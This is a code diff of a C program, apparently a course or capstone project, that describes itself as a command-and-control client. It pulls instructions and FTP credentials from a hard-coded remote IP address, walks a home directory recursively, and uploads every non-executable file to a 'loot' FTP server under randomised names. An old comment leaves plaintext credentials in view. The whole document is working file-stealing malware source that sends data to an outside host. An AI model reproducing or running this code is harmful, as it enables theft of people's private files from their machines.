@@ -5,11 +5,12 @@
 #include <dirent.h>
 #include <sys/stat.h>
 #include <errno.h>
+#include <time.h>
+#include <unistd.h>
 
 /* Compilation: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast
  * sudo apt install libcurl4-openssl-dev
  * gcc main.c -o main -lcurl
- *
 */
 
 /* Supported Directives:
@@ -17,7 +18,7 @@
 */
 
 /* Operating the C2:
- * Leave the directive in "instruction.txt" and serve at CADDRESS as shown below.
+ * Leave the directive in "instruction.txt" and serve at CADDRESS as shown below. Same goes for username and password in their respective files listed below.
  * The configuration of the FTP is quite sensitive:
  * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port)
  * 	- The root directory of the user used to login to the server should be set to the directory that will contain the stolen files. That is why only the file is specified in the FTP link (local_root)
@@ -35,31 +36,38 @@
 
 char * readFile(char * fileName);
 char * takeControlInstruction(void); 
-void Copy(char * rootDirectory);
-void copyContents(char * fileName, char * suffix);
+void Copy(char * rootDirectory, char * username, char * password);
+void copyContents(char * fileName, char * suffix, char * username, char * password);
+char * takeUsername(void);
+char * takePassword(void);
+char * cleanString(char * string);
+char * generateRandomSequence();
 
 // Globals:
 
-char * CADDRESS = "http://70.77.131.111:5678/instruction.txt";		// "http://192.168.0.200:5678/instruction.txt"
-char * BASEDIRECTORY = "/home/ezra/test";
-char * REMOTEPATH = "itinerant@70.77.131.111:/home/itinerant/CONTROLLER/loot/";
+char * CADDRESS = "http://70.77.131.111:5677/instruction.txt";		// "http://192.168.0.200:5678/instruction.txt"
+char * USERNAMEADDRESS = "http://70.77.131.111:5677/username.txt"; 
+char * PASSWORDADDRESS = "http://70.77.131.111:5677/password.txt"; 
+char * BASEDIRECTORY = "/home/ezra/Semester3/Scripting/assignment6";
 
 // Main function:
 
-int main(int argc, char * argv[]) {
+int main(void) {
 	
-	/*char * controllerDirective;*/
-	/*controllerDirective = takeControlInstruction();*/
-	/*printf("%s", controllerDirective);*/
+	char * controllerDirective;
+	char * username = cleanString(takeUsername());
+	char * password = cleanString(takePassword());
+	controllerDirective = takeControlInstruction();
+	printf("%s", controllerDirective);
 
-	Copy(BASEDIRECTORY);
+	Copy(BASEDIRECTORY, username, password);
 
 	return 0;
 }
 
 // Function definitions:
 
-void Copy(char * rootDirectory) {
+void Copy(char * rootDirectory, char * username, char * password) {
 	
 	char * current;
 
@@ -80,15 +88,17 @@ void Copy(char * rootDirectory) {
 
 		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
 			current = fullPath;
-			printf("File: %s\n", current);
-			copyContents(current, entry->d_name);				// Calling copyContents
+			/*printf("File: %s\n", current);*/
+			if (access(fullPath, X_OK) != 0) {							// Checking if the file is executable; if so, we don't care about it.
+				copyContents(current, entry->d_name, username, password);				// Calling copyContents
+			}
 		}
 		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
 			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
 				/*current = strcat(fullPath, "/");		*/
 				/*printf("Directory: %s\n ", current);*/
-				printf("Directory: %s\n ", fullPath);
-				Copy(fullPath);
+				/*printf("Directory: %s\n ", fullPath);*/
+				Copy(fullPath, username, password);
 			}
 			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
 				/*printf("EXCEPTION: %s\n", entry->d_name);*/
@@ -100,16 +110,21 @@ void Copy(char * rootDirectory) {
 	closedir(dir);
 }
 
-void copyContents(char * fileName, char * suffix) {			// Root dir on the server is /home/itinerant/CONTROLLER/loot/
+void copyContents(char * fileName, char * suffix, char * username, char * password) {		// This copies a single file per call	
 
 	CURL * curl;
 	CURLcode res;
+
+	char * randomPrefix = generateRandomSequence();
+
+	printf("File: %s Random Prefix: %s\n", fileName, randomPrefix);
 
 	FILE * srcFile;
 	struct stat fileInfo;
 
 	if (stat(fileName, &fileInfo)) {
 		printf("Could not open %s: %s", fileName, strerror(errno));
+		return;
 	}
 
 	srcFile = fopen(fileName, "rb");
@@ -118,13 +133,15 @@ void copyContents(char * fileName, char * suffix) {			// Root dir on the server 
 	curl = curl_easy_init();
 
 	if (curl) {
-		curl_easy_setopt(curl, CURLOPT_USERNAME, "test");
-		curl_easy_setopt(curl, CURLOPT_PASSWORD, "capstonepassword");
+		curl_easy_setopt(curl, CURLOPT_USERNAME, username);
+		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);
 
 		curl_easy_setopt(curl, CURLOPT_FTP_USE_EPSV, 1L);
 
+		char * dstFileName = strcat(randomPrefix, suffix);
+
 		char prelimLink[1024] = "ftp://70.77.131.111:5678/";		// test:capstonepassword
-		char * link = strcat(prelimLink, suffix);
+		char * link = strcat(prelimLink, dstFileName);			// revert to suffix if this breaks
 
 		printf("LINK: %s\n", link);
 
@@ -143,7 +160,7 @@ void copyContents(char * fileName, char * suffix) {			// Root dir on the server 
 		}
 
 		curl_easy_cleanup(curl);
-	}
+	} else {return;}
 
 	fclose(srcFile);
 
@@ -186,4 +203,76 @@ char * readFile(char * fileName) {
 	fclose(file);
 
 	return contents;
+}
+
+char * takeUsername(void) {
+	CURL * curl;
+	CURLcode res;
+	freopen("username", "w", stdout);				
+
+	curl = curl_easy_init();									
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, USERNAMEADDRESS);		
+		res = curl_easy_perform(curl);								
+		if (res != CURLE_OK) {									
+		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		}
+		curl_easy_cleanup(curl);								
+	}
+	
+	freopen("/dev/tty", "w", stdout);		
+
+	char * username = readFile("username");
+	
+	return username;
+}
+
+char * takePassword(void) {
+	CURL * curl;
+	CURLcode res;
+	freopen("password", "w", stdout);				
+
+	curl = curl_easy_init();									
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, PASSWORDADDRESS);		
+		res = curl_easy_perform(curl);								
+		if (res != CURLE_OK) {									
+		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		}
+		curl_easy_cleanup(curl);								
+	}
+	
+	freopen("/dev/tty", "w", stdout);		
+
+	char * password = readFile("password");
+	
+	return password;
+}
+
+char * cleanString(char * string) {
+	int length = strlen(string);
+
+	if (string[length - 1] == '\n') {
+		string[length - 1] = '\0';
+	}
+	return string;
+}
+
+char * generateRandomSequence() {				// This will generate random sequences 9 characters in length
+
+	char alphaSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+	char * sequence = malloc(9);
+
+	srand(time(NULL));
+	/*int r = rand();*/
+
+	for (int i = 0; i < 9; i++) {
+		int key = rand() % (int)(sizeof(alphaSet) - 1);
+		sequence[i] = alphaSet[key];
+	}
+	
+	/*sequence[8] = '\0';*/
+
+	return sequence;
 }
